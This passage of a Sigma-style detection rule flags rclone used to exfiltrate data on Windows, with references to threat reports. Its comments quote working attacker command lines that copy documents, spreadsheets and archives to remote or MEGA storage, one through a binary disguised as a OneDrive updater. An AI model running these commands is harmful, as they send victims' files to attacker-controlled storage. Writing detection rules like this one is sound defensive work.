    - https://www.seqrite.com/blog/operation-camelclone-multi-region-espionage-campaign-targets-government-and-defense-entities-amidst-regional-tensions/
    - https://ctrlaltintel.com/research/MuddyWater/
  tags:
    - attack.exfiltration
    - attack.t1567
  logsource:
      category: process_creation
      product: windows
  detection:
    selection_name:
      Image|endswith: 'rclone.exe' # https://arcticwolf.com/resources/blog/exploitation-of-cve-2026-0257-leads-to-qilin-ransomware/; https://www.picussecurity.com/resource/blog/inc-ransomware-explained-how-it-attacks-healthcare-and-education
      CommandLine|contains: 'rclone' # https://ctrlaltintel.com/research/MuddyWater/; https://labs.yarix.com/2026/05/unusual-data-exfiltration-paths-leveraging-rclone-for-sharepoint-data-theft/
    selection_args:
      - CommandLine|contains|all:
        - 'rcd' #rclone.exe rcd --rc-web-gui
        - 'rc-web-gui'
      - CommandLine|contains|all:
        - 'copy'
        - 'config'
        - 'auto-confirm'
        - '-q' #rclone.exe copy --config=C:/temp/rclone.conf “C:/data” remote:data -q --ignore-existing --auto-confirm
      - CommandLine|contains|all:
        - 'copy'
        - 'remote:'
        - 'bwlimit'
      - CommandLine|contains|all:
        - 'copy'
        - 'remote:'
        - 'max-size'
      - CommandLine|contains|all:
        - 'copy'
        - 'mega:' #rclone  copy B:\\MSSQL mega:redacted --progress; https://medium.com/@DCSO_CyTec/catch-them-while-you-can-5c43007ae99e
      - CommandLine|contains|all:
        - 'copy'
        - 'remote:'
        - 'max-age'
      - CommandLine|contains|all:
        - 'copy'
        - 'remote:'
        - 'include' #"C:\Users\%USERNAME%\AppData\Local\Microsoft\OneDrive\Update\UpdateService.exe" "copy" "C:\Users\%USERNAME%\Desktop" "remote:%COMPUTERNAME%\Desktop" "--include" "*.{{jpe?g|txt|docx?|rtf|pdf|xlsx?|xlsm|pptx?|zip|rar|7z}}" "-M" "--max-size" "50M" "--max-age" "200d" "--bwlimit" "1M:1M" "--order-by" "modtime,desc" "--log-file=C:\Users\%USERNAME%\AppData\Local\Microsoft\OneDrive\Update\log_1.dat" "-vv"; https://www.seqrite.com/blog/operation-camelclone-multi-region-espionage-campaign-targets-government-and-defense-entities-amidst-regional-tensions/
    filters:
      - CommandLine|endswith:
        - ' config' #rclone.exe  config
      - CommandLine|contains:
        - ' mount ' #D:\rclone\rclone.exe  mount my_RC: N: --network-mode --vfs-cache-mode full --no-console
    condition: (selection_name or selection_args) and not filters
  falsepositives:
    - Storage providers approved for business use.
    - The reliance on the surrounding environment may necessitate the implementation of additional filtering measures to prevent false positives.
  level: medium
level: medium
